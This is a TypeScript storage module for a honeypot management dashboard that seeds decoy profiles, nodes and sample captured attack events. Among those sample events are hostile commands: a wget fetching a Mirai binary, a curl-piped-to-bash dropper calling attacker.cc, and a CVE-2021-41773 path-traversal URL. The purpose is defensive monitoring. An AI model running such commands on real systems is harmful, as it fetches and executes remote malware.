import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import {
  HoneypotNode,
  HoneypotProfile,
  AttackEvent,
  SystemStats,
  BeaconPayload,
} from './types';
import { eventEmitter } from './events-emitter';

interface DatabaseSchema {
  version: number;
  profiles: HoneypotProfile[];
  nodes: HoneypotNode[];
  events: AttackEvent[];
}

const DATA_DIR = path.join(process.cwd(), 'data');
const DB_FILE = path.join(DATA_DIR, 'honeyforge_db.json');

// Кэш в оперативной памяти для быстрых вызовов Next.js SSR / API с фоновым сохранением
let cachedDb: DatabaseSchema | null = null;
let writeTimeout: NodeJS.Timeout | null = null;

function generateId(prefix = 'id'): string {
  return `${prefix}_${crypto.randomBytes(6).toString('hex')}`;
}

const DEFAULT_PROFILES: HoneypotProfile[] = [
  {
    id: 'prof_linux_bastion',
    name: 'Linux Edge Bastion (Low-Interaction)',
    description: 'Emulates standard Debian/Ubuntu server with exposed SSH, HTTP and FTP services. Low-risk port trap.',
    interactionLevel: 'low',
    honeypotType: 'emulator',
    ports: [21, 22, 80, 8080],
    services: [
      {
        port: 21,
        service: 'FTP',
        banner: '220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.1.55]',
        enabled: true,
      },
      {
        port: 22,
        service: 'SSH',
        banner: 'SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1',
        enabled: true,
      },
      {
        port: 80,
        service: 'HTTP',
        banner: 'Apache/2.4.51 (Debian) Server at localhost Port 80',
        enabled: true,
      },
      {
        port: 8080,
        service: 'HTTP-Proxy',
        banner: 'Squid/4.13 Proxy Server',
        enabled: true,
      },
    ],
    decoyCredentials: [
      { username: 'root', password: 'password123', role: 'Администратор' },
      { username: 'admin', password: 'admin@2026', role: 'Служебный аккаунт' },
    ],
    agentConfig: {
      beaconIntervalSeconds: 15,
      jitterPercent: 20,
      maskProcessName: 'systemd-resolved',
      bufferLimit: 5000,
      logRotationMb: 25,
    },
    createdAt: new Date(Date.now() - 86400000 * 7).toISOString(),
    updatedAt: new Date(Date.now() - 86400000 * 3).toISOString(),
  },
  {
    id: 'prof_iot_decoy',
    name: 'IoT Smart Hub Decoy (Low-Interaction)',
    description: 'Simulates busybox router / smart home gateway. Catches Mirai variants and automated botnet brute-force scans.',
    interactionLevel: 'low',
    honeypotType: 'emulator',
    ports: [23, 80, 554, 8081],
    services: [
      {
        port: 23,
        service: 'Telnet',
        banner: 'BusyBox v1.22.1 (2018-05-10 11:24:00 CST) built-in shell (ash)\nEnter \'help\' for a list of built-in commands.\n\nlogin: ',
        enabled: true,
      },
      {
        port: 80,
        service: 'HTTP',
        banner: 'micro_httpd/0.5 05jan2010 (Boa/0.94.13)',
        enabled: true,
      },
      {
        port: 554,
        service: 'RTSP',
        banner: 'RTSP/1.0 200 OK\r\nServer: HIKVISION Streaming Server 3.0\r\n',
        enabled: true,
      },
    ],
    decoyCredentials: [
      { username: 'admin', password: 'admin', role: 'Шлюз IoT' },
      { username: 'default', password: 'password', role: 'Устройство' },
    ],
    agentConfig: {
      beaconIntervalSeconds: 10,
      jitterPercent: 25,
      maskProcessName: 'kworker/u2:0',
      bufferLimit: 3000,
      logRotationMb: 10,
    },
    createdAt: new Date(Date.now() - 86400000 * 5).toISOString(),
    updatedAt: new Date(Date.now() - 86400000 * 2).toISOString(),
  },
  {
    id: 'prof_medium_cowrie',
    name: 'Enterprise SSH Honeypot (Medium-Interaction Cowrie)',
    description: 'Cowrie interactive SSH/Telnet honeypot with file download capture, session recording and fake root shell.',
    interactionLevel: 'medium',
    honeypotType: 'cowrie',
    ports: [2222, 2323],
    services: [
      {
        port: 2222,
        service: 'Cowrie SSH',
        banner: 'SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2',
        enabled: true,
      },
      {
        port: 2323,
        service: 'Cowrie Telnet',
        banner: 'Ubuntu 20.04.2 LTS\nlogin: ',
        enabled: true,
      },
    ],
    decoyCredentials: [
      { username: 'support', password: 'Password@2026', role: 'Техподдержка' },
      { username: 'deploy', password: 'deploy_secret_token', role: 'CI/CD Воркер' },
    ],
    agentConfig: {
      beaconIntervalSeconds: 20,
      jitterPercent: 15,
      maskProcessName: 'rsyslogd',
      bufferLimit: 10000,
      logRotationMb: 50,
    },
    createdAt: new Date(Date.now() - 86400000 * 2).toISOString(),
    updatedAt: new Date().toISOString(),
  },
];

const DEFAULT_NODES: HoneypotNode[] = [
  {
    id: 'node_dmz_edge_01',
    name: 'DMZ Perimeter Sentinel',
    hostname: 'gw-ext-fw01.prod.internal',
    ip: '198.51.100.42',
    status: 'online',
    lastSeen: new Date().toISOString(),
    profileId: 'prof_linux_bastion',
    profileName: 'Linux Edge Bastion (Low-Interaction)',
    version: '1.2.0',
    maskProcess: 'systemd-resolved',
    os: 'Linux 5.15.0-89-generic (x86_64)',
    jitterSeconds: 15,
    stats: {
      totalEvents: 428,
      lastEventAt: new Date(Date.now() - 120000).toISOString(),
      uptimeSeconds: 384200,
      cpuPercent: 1.4,
      memoryMb: 42,
    },
    tags: ['dmz', 'edge-gateway', 'frankfurt'],
    registeredAt: new Date(Date.now() - 86400000 * 4).toISOString(),
  },
  {
    id: 'node_iot_branch_02',
    name: 'Branch Office IoT Trap',
    hostname: 'iot-hub-vlan30.branch.lan',
    ip: '10.24.120.15',
    status: 'online',
    lastSeen: new Date(Date.now() - 45000).toISOString(),
    profileId: 'prof_iot_decoy',
    profileName: 'IoT Smart Hub Decoy (Low-Interaction)',
    version: '1.2.0',
    maskProcess: 'kworker/u2:0',
    os: 'Linux 5.10.103-v7l+ (armv7l)',
    jitterSeconds: 10,
    stats: {
      totalEvents: 891,
      lastEventAt: new Date(Date.now() - 45000).toISOString(),
      uptimeSeconds: 1209600,
      cpuPercent: 0.8,
      memoryMb: 28,
    },
    tags: ['branch', 'iot', 'vlan-internal'],
    registeredAt: new Date(Date.now() - 86400000 * 6).toISOString(),
  },
  {
    id: 'node_cloud_dev_03',
    name: 'AWS Staging Decoy',
    hostname: 'ip-172-31-42-99.eu-west-1.compute.internal',
    ip: '203.0.113.88',
    status: 'degraded',
    lastSeen: new Date(Date.now() - 600000).toISOString(),
    profileId: 'prof_medium_cowrie',
    profileName: 'Enterprise SSH Honeypot (Medium-Interaction Cowrie)',
    version: '1.1.8',
    maskProcess: 'rsyslogd',
    os: 'Linux 6.1.0-18-cloud-amd64',
    jitterSeconds: 20,
    stats: {
      totalEvents: 147,
      lastEventAt: new Date(Date.now() - 620000).toISOString(),
      uptimeSeconds: 84300,
      cpuPercent: 2.1,
      memoryMb: 85,
    },
    tags: ['cloud', 'aws', 'staging'],
    registeredAt: new Date(Date.now() - 86400000 * 2).toISOString(),
  },
];

const DEFAULT_EVENTS: AttackEvent[] = [
  {
    id: 'evt_001',
    agentId: 'node_dmz_edge_01',
    agentName: 'DMZ Perimeter Sentinel',
    timestamp: new Date(Date.now() - 120000).toISOString(),
    sourceIp: '185.220.101.5',
    sourcePort: 49152,
    destPort: 22,
    protocol: 'SSH',
    honeypotType: 'emulator',
    eventType: 'auth_attempt',
    severity: 'critical',
    details: {
      username: 'root',
      password: 'ChangeMe2024!',
      command: '',
      payload: 'SSH-2.0-libssh_0.9.5 banner probe + password brute force',
      rawData: 'Client banner: SSH-2.0-libssh_0.9.5\r\nKex: diffie-hellman-group14-sha256',
    },
    country: 'Netherlands',
    city: 'Amsterdam',
    asn: 'AS208323',
  },
  {
    id: 'evt_002',
    agentId: 'node_iot_branch_02',
    agentName: 'Branch Office IoT Trap',
    timestamp: new Date(Date.now() - 340000).toISOString(),
    sourceIp: '45.154.255.89',
    sourcePort: 55432,
    destPort: 23,
    protocol: 'TELNET',
    honeypotType: 'emulator',
    eventType: 'auth_attempt',
    severity: 'high',
    details: {
      username: 'admin',
      password: 'admin1234',
      command: 'sh\ncat /proc/mounts; cd /tmp && wget http://185.196.8.2/mirai.arm7',
      payload: 'Mirai automated botnet propagation script payload',
    },
    country: 'Seychelles',
    city: 'Victoria',
    asn: 'AS59604',
  },
  {
    id: 'evt_003',
    agentId: 'node_dmz_edge_01',
    agentName: 'DMZ Perimeter Sentinel',
    timestamp: new Date(Date.now() - 720000).toISOString(),
    sourceIp: '89.248.165.74',
    sourcePort: 37821,
    destPort: 80,
    protocol: 'HTTP',
    honeypotType: 'emulator',
    eventType: 'vulnerability_exploit',
    severity: 'critical',
    details: {
      method: 'GET',
      url: '/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh',
      userAgent: 'Mozilla/5.0 (compatible; Nessus/10.4.0)',
      payload: 'Apache HTTP Server 2.4.49/2.4.50 Path Traversal (CVE-2021-41773)',
      headers: {
        Host: '198.51.100.42',
        'User-Agent': 'Mozilla/5.0 (compatible; Nessus/10.4.0)',
      },
    },
    country: 'Germany',
    city: 'Frankfurt',
    asn: 'AS202425',
  },
  {
    id: 'evt_004',
    agentId: 'node_iot_branch_02',
    agentName: 'Branch Office IoT Trap',
    timestamp: new Date(Date.now() - 1500000).toISOString(),
    sourceIp: '194.26.29.112',
    sourcePort: 60111,
    destPort: 23,
    protocol: 'TELNET',
    honeypotType: 'emulator',
    eventType: 'port_scan',
    severity: 'low',
    details: {
      rawData: 'SYN scan / Masscan probe packet',
      payload: 'TCP SYN on port 23',
    },
    country: 'Russia',
    city: 'Moscow',
    asn: 'AS48287',
  },
  {
    id: 'evt_005',
    agentId: 'node_cloud_dev_03',
    agentName: 'AWS Staging Decoy',
    timestamp: new Date(Date.now() - 3600000).toISOString(),
    sourceIp: '167.99.192.3',
    sourcePort: 42100,
    destPort: 2222,
    protocol: 'SSH',
    honeypotType: 'cowrie',
    eventType: 'command_exec',
    severity: 'critical',
    details: {
      username: 'support',
      password: 'password123',
      command: 'uname -a; curl -s http://attacker.cc/c.sh | bash',
      payload: 'Post-exploitation dropper attempt captured by Cowrie session',
    },
    country: 'United States',
    city: 'New York',
    asn: 'AS14061',
  },
  {
    id: 'evt_006',
    agentId: 'node_dmz_edge_01',
    agentName: 'DMZ Perimeter Sentinel',
    timestamp: new Date(Date.now() - 7200000).toISOString(),
    sourceIp: '193.163.125.10',
    sourcePort: 51234,
    destPort: 8080,
    protocol: 'HTTP',
    honeypotType: 'emulator',
    eventType: 'probe',
    severity: 'medium',
    details: {
      method: 'POST',
      url: '/actuator/gateway/routes/hack',
      userAgent: 'python-requests/2.28.1',
      payload: 'Spring Cloud Gateway Code Injection probe (CVE-2022-22947)',
    },
    country: 'Bulgaria',
    city: 'Sofia',
    asn: 'AS200019',
  },
];

function initDb(): DatabaseSchema {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
    }

    if (fs.existsSync(DB_FILE)) {
      const raw = fs.readFileSync(DB_FILE, 'utf-8');
      const parsed = JSON.parse(raw) as DatabaseSchema;
      if (parsed && Array.isArray(parsed.profiles) && Array.isArray(parsed.nodes)) {
        return parsed;
      }
    }
  } catch (err) {
    console.warn('[Storage] Could not read db file, using seed defaults:', err);
  }

  const initialDb: DatabaseSchema = {
    version: 1,
    profiles: DEFAULT_PROFILES,
    nodes: DEFAULT_NODES,
    events: DEFAULT_EVENTS,
  };

  saveDbSync(initialDb);
  return initialDb;
}

function saveDbSync(db: DatabaseSchema): void {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
    }
    const tempFile = `${DB_FILE}.${Date.now()}.tmp`;
    fs.writeFileSync(tempFile, JSON.stringify(db, null, 2), 'utf-8');
    fs.renameSync(tempFile, DB_FILE);
  } catch (err) {
    console.error('[Storage] Error persisting db to disk:', err);
  }
}

function getDb(): DatabaseSchema {
  if (!cachedDb) {
    cachedDb = initDb();
  }
  return cachedDb;
}

function scheduleSave(): void {
  if (writeTimeout) return;
  writeTimeout = setTimeout(() => {
    writeTimeout = null;
    if (cachedDb) {
      saveDbSync(cachedDb);
    }
  }, 100);
}

// -------------------------------------------------------------
// ОПЕРАЦИИ С ПРОФИЛЯМИ (FR-C1)
// -------------------------------------------------------------

export function getProfiles(): HoneypotProfile[] {
  return getDb().profiles;
}

export function getProfile(id: string): HoneypotProfile | undefined {
  return getDb().profiles.find((p) => p.id === id);
}

export function createProfile(
  data: Omit<HoneypotProfile, 'id' | 'createdAt' | 'updatedAt'>
): HoneypotProfile {
  const db = getDb();
  const now = new Date().toISOString();
  const newProfile: HoneypotProfile = {
    ...data,
    id: generateId('prof'),
    createdAt: now,
    updatedAt: now,
  };
  db.profiles.push(newProfile);
  scheduleSave();
  return newProfile;
}

export function updateProfile(
  id: string,
  data: Partial<Omit<HoneypotProfile, 'id' | 'createdAt'>>
): HoneypotProfile | undefined {
  const db = getDb();
  const index = db.profiles.findIndex((p) => p.id === id);
  if (index === -1) return undefined;

  const updated: HoneypotProfile = {
    ...db.profiles[index],
    ...data,
    updatedAt: new Date().toISOString(),
  };
  db.profiles[index] = updated;

  // Также обновляем profileName для привязанных нод
  db.nodes.forEach((n) => {
    if (n.profileId === id) {
      n.profileName = updated.name;
    }
  });

  scheduleSave();
  return updated;
}

export function deleteProfile(id: string): boolean {
  const db = getDb();
  const initialLen = db.profiles.length;
  db.profiles = db.profiles.filter((p) => p.id !== id);
  if (db.profiles.length !== initialLen) {
    scheduleSave();
    return true;
  }
  return false;
}

// -------------------------------------------------------------
// ОПЕРАЦИИ С НОДАМИ (FR-C2)
// -------------------------------------------------------------

export function getNodes(): HoneypotNode[] {
  const db = getDb();
  const now = Date.now();

  // Динамический пересчет статуса online / offline / degraded на основе lastSeen
  db.nodes.forEach((node) => {
    const diffSec = (now - new Date(node.lastSeen).getTime()) / 1000;
    const interval = node.jitterSeconds || 15;
    if (diffSec > interval * 6) {
      node.status = 'offline';
    } else if (diffSec > interval * 2.5) {
      node.status = 'degraded';
    } else {
      node.status = 'online';
    }
  });

  return db.nodes;
}

export function getNode(id: string): HoneypotNode | undefined {
  return getNodes().find((n) => n.id === id);
}

export function upsertNode(nodeData: Partial<HoneypotNode> & { id: string }): HoneypotNode {
  const db = getDb();
  const index = db.nodes.findIndex((n) => n.id === nodeData.id);
  const now = new Date().toISOString();

  let profile = db.profiles.find((p) => p.id === nodeData.profileId);
  if (!profile && db.profiles.length > 0) {
    profile = db.profiles[0];
  }

  if (index >= 0) {
    const existing = db.nodes[index];
    const updated: HoneypotNode = {
      ...existing,
      ...nodeData,
      status: 'online',
      lastSeen: now,
      profileId: profile ? profile.id : existing.profileId,
      profileName: profile ? profile.name : existing.profileName,
      stats: {
        ...existing.stats,
        ...(nodeData.stats || {}),
      },
    };
    db.nodes[index] = updated;
    scheduleSave();
    eventEmitter.emit({ type: 'node_update', data: updated });
    return updated;
  } else {
    const newNode: HoneypotNode = {
      id: nodeData.id,
      name: nodeData.name || `Honeypot-${nodeData.id.slice(-4)}`,
      hostname: nodeData.hostname || 'unknown-host',
      ip: nodeData.ip || '127.0.0.1',
      status: 'online',
      lastSeen: now,
      profileId: profile ? profile.id : 'prof_linux_bastion',
      profileName: profile ? profile.name : 'Linux Edge Bastion (Low-Interaction)',
      version: nodeData.version || '1.0.0',
      maskProcess: nodeData.maskProcess || (profile?.agentConfig.maskProcessName ?? 'systemd-resolved'),
      os: nodeData.os || 'Linux',
      jitterSeconds: profile?.agentConfig.beaconIntervalSeconds || 15,
      stats: nodeData.stats || {
        totalEvents: 0,
        uptimeSeconds: 0,
      },
      tags: nodeData.tags || ['decoy'],
      registeredAt: now,
    };
    db.nodes.push(newNode);
    scheduleSave();
    eventEmitter.emit({ type: 'node_update', data: newNode });
    return newNode;
  }
}

export function updateNodeHeartbeat(payload: BeaconPayload): {
  node: HoneypotNode;
  configUpdated: boolean;
  profile?: HoneypotProfile;
} {
  const db = getDb();
  let node = db.nodes.find((n) => n.id === payload.agent_id);
  const now = new Date().toISOString();

  if (!node) {
    node = upsertNode({
      id: payload.agent_id,
      hostname: payload.hostname,
      ip: payload.ip || '127.0.0.1',
      os: payload.os || 'Linux',
      version: payload.version || '1.0.0',
      maskProcess: payload.mask_process || 'systemd-resolved',
      stats: {
        totalEvents: payload.stats?.total_events || 0,
        uptimeSeconds: payload.stats?.uptime_seconds || 0,
        cpuPercent: payload.stats?.cpu_percent,
        memoryMb: payload.stats?.memory_mb,
      },
    });
  } else {
    node.lastSeen = now;
    node.status = 'online';
    if (payload.hostname) node.hostname = payload.hostname;
    if (payload.ip) node.ip = payload.ip;
    if (payload.os) node.os = payload.os;
    if (payload.version) node.version = payload.version;
    if (payload.mask_process) node.maskProcess = payload.mask_process;
    if (payload.stats) {
      node.stats.uptimeSeconds = payload.stats.uptime_seconds ?? node.stats.uptimeSeconds;
      node.stats.totalEvents = Math.max(node.stats.totalEvents, payload.stats.total_events ?? 0);
      node.stats.cpuPercent = payload.stats.cpu_percent;
      node.stats.memoryMb = payload.stats.memory_mb;
    }
  }

  // Проверка хэша конфигурации: требуется ли агенту обновление профиля
  const assignedProfile = db.profiles.find((p) => p.id === node.profileId) || db.profiles[0];
  const profileHash = crypto
    .createHash('md5')
    .update(JSON.stringify(assignedProfile))
    .digest('hex');

  const configUpdated = Boolean(
    payload.current_config_hash && payload.current_config_hash !== profileHash
  );

  scheduleSave();
  eventEmitter.emit({ type: 'node_update', data: node });

  return {
    node,
    configUpdated,
    profile: configUpdated ? assignedProfile : undefined,
  };
}

export function deleteNode(id: string): boolean {
  const db = getDb();
  const initialLen = db.nodes.length;
  db.nodes = db.nodes.filter((n) => n.id !== id);
  if (db.nodes.length !== initialLen) {
    scheduleSave();
    return true;
  }
  return false;
}

export function assignProfileToNode(nodeId: string, profileId: string): HoneypotNode | undefined {
  const db = getDb();
  const node = db.nodes.find((n) => n.id === nodeId);
  const profile = db.profiles.find((p) => p.id === profileId);
  if (!node || !profile) return undefined;

  node.profileId = profile.id;
  node.profileName = profile.name;
  node.jitterSeconds = profile.agentConfig.beaconIntervalSeconds;
  node.maskProcess = profile.agentConfig.maskProcessName;

  scheduleSave();
  eventEmitter.emit({ type: 'node_update', data: node });
  return node;
}

// -------------------------------------------------------------
// ОПЕРАЦИИ С СОБЫТИЯМИ (FR-C4, FR-C5)
// -------------------------------------------------------------

export function getEvents(filter?: {
  limit?: number;
  offset?: number;
  severity?: string;
  agentId?: string;
  search?: string;
  from?: string;
  to?: string;
  type?: string;
}): { events: AttackEvent[]; total: number } {
  const db = getDb();
  let list = [...db.events];

  // Сортировка: сначала новые
  list.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());

  if (filter?.severity && filter.severity !== 'all') {
    list = list.filter((e) => e.severity === filter.severity);
  }

  if (filter?.type && filter.type !== 'all') {
    list = list.filter((e) => e.eventType === filter.type);
  }

  if (filter?.agentId && filter.agentId !== 'all') {
    list = list.filter((e) => e.agentId === filter.agentId);
  }

  if (filter?.from) {
    const fromTime = new Date(filter.from).getTime();
    if (!isNaN(fromTime)) {
      list = list.filter((e) => new Date(e.timestamp).getTime() >= fromTime);
    }
  }

  if (filter?.to) {
    const toTime = new Date(filter.to).getTime();
    if (!isNaN(toTime)) {
      list = list.filter((e) => new Date(e.timestamp).getTime() <= toTime);
    }
  }

  if (filter?.search) {
    const q = filter.search.toLowerCase();
    list = list.filter(
      (e) =>
        e.sourceIp.toLowerCase().includes(q) ||
        e.protocol.toLowerCase().includes(q) ||
        (e.details.payload && e.details.payload.toLowerCase().includes(q)) ||
        (e.details.username && e.details.username.toLowerCase().includes(q)) ||
        (e.details.command && e.details.command.toLowerCase().includes(q)) ||
        (e.country && e.country.toLowerCase().includes(q))
    );
  }

  const total = list.length;
  const offset = filter?.offset || 0;
  const limit = filter?.limit || 50;
  const sliced = list.slice(offset, offset + limit);

  return { events: sliced, total };
}

export function recordEvents(
  rawEvents: Array<Omit<AttackEvent, 'id'> & { id?: string }>
): AttackEvent[] {
  const db = getDb();
  const savedList: AttackEvent[] = [];

  for (const raw of rawEvents) {
    const event: AttackEvent = {
      ...raw,
      id: raw.id || generateId('evt'),
      timestamp: raw.timestamp || new Date().toISOString(),
      details: raw.details || {},
      severity: raw.severity || 'medium',
      eventType: raw.eventType || 'probe',
      destPort: raw.destPort || 80,
      protocol: raw.protocol || 'TCP',
    };

    db.events.unshift(event);
    savedList.push(event);

    // Обновление счетчиков событий ноды
    const node = db.nodes.find((n) => n.id === event.agentId);
    if (node) {
      node.stats.totalEvents += 1;
      node.stats.lastEventAt = event.timestamp;
    }
  }

  // Хранение максимум 20 000 событий в хранилище MVP для предотвращения переполнения памяти
  if (db.events.length > 20000) {
    db.events = db.events.slice(0, 20000);
  }

  scheduleSave();

  // Рассылка активным подписчикам SSE
  if (savedList.length === 1) {
    eventEmitter.emit({ type: 'attack_event', data: savedList[0] });
  } else if (savedList.length > 1) {
    eventEmitter.emit({ type: 'attack_batch', data: savedList });
  }

  return savedList;
}

export function clearEvents(): void {
  const db = getDb();
  db.events = [];
  scheduleSave();
}

// -------------------------------------------------------------
// СИСТЕМНАЯ СТАТИСТИКА И МЕТРИКИ
// -------------------------------------------------------------

export function getStats(): SystemStats {
  const db = getDb();
  const nodes = getNodes();
  const onlineNodes = nodes.filter((n) => n.status === 'online').length;
  const offlineNodes = nodes.filter((n) => n.status === 'offline').length;

  const oneDayAgo = Date.now() - 86400000;
  const events24h = db.events.filter(
    (e) => new Date(e.timestamp).getTime() >= oneDayAgo
  );

  const criticalEvents = db.events.filter((e) => e.severity === 'critical').length;

  // Агрегация по протоколам
  const protoMap: Record<string, number> = {};
  db.events.forEach((e) => {
    const p = (e.protocol || 'OTHER').toUpperCase();
    protoMap[p] = (protoMap[p] || 0) + 1;
  });
  const topProtocols = Object.entries(protoMap)
    .map(([protocol, count]) => ({ protocol, count }))
    .sort((a, b) => b.count - a.count)
    .slice(0, 6);

  // Топ IP-адресов атакующих
  const ipMap: Record<string, { count: number; country?: string }> = {};
  db.events.forEach((e) => {
    if (!ipMap[e.sourceIp]) {
      ipMap[e.sourceIp] = { count: 0, country: e.country };
    }
    ipMap[e.sourceIp].count += 1;
  });
  const topAttackerIps = Object.entries(ipMap)
    .map(([ip, data]) => ({ ip, count: data.count, country: data.country }))
    .sort((a, b) => b.count - a.count)
    .slice(0, 5);

  // Почасовая динамика за последние 12 интервалов
  const recentVelocity: Array<{ time: string; count: number }> = [];
  for (let i = 11; i >= 0; i--) {
    const startHour = Date.now() - (i + 1) * 3600000;
    const endHour = Date.now() - i * 3600000;
    const hourLabel = new Date(endHour).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    const count = db.events.filter((e) => {
      const t = new Date(e.timestamp).getTime();
      return t >= startHour && t < endHour;
    }).length;
    recentVelocity.push({ time: hourLabel, count });
  }

  return {
    totalNodes: nodes.length,
    onlineNodes,
    offlineNodes,
    totalProfiles: db.profiles.length,
    totalEvents: db.events.length,
    eventsLast24h: events24h.length,
    criticalEvents,
    topProtocols,
    topAttackerIps,
    recentVelocity,
  };
}
